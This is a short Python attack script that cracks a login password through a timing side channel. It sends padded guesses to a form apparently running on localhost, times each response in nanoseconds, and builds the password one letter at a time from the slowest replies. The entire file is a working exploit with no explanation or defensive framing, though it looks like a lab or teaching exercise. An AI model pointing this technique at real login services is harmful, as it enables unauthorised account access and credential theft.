import requests
from string import ascii_lowercase
import time

def cracked_letter(cracked, padding):
    results = {key: 0 for key in ascii_lowercase}
    for _ in range(3):
        for letter in ascii_lowercase:
            input_string = cracked + letter + '-' * padding
            start = time.time_ns()
            login(input_string)
            end = time.time_ns()
            results[letter] += end - start
    return sorted(results, key=results.get, reverse=True)[0]

def login(user_password):
    url = 'http://127.0.0.1:5000/'
    data = {'password': user_password}
    response = requests.post(url, data=data)
    return response.text

padding_length = 8
cracked_letters = ''

for _ in range(padding_length):
    next_letter = cracked_letter(cracked_letters, padding_length - 1)
    cracked_letters += next_letter
    padding_length -= 1
    print(cracked_letters)

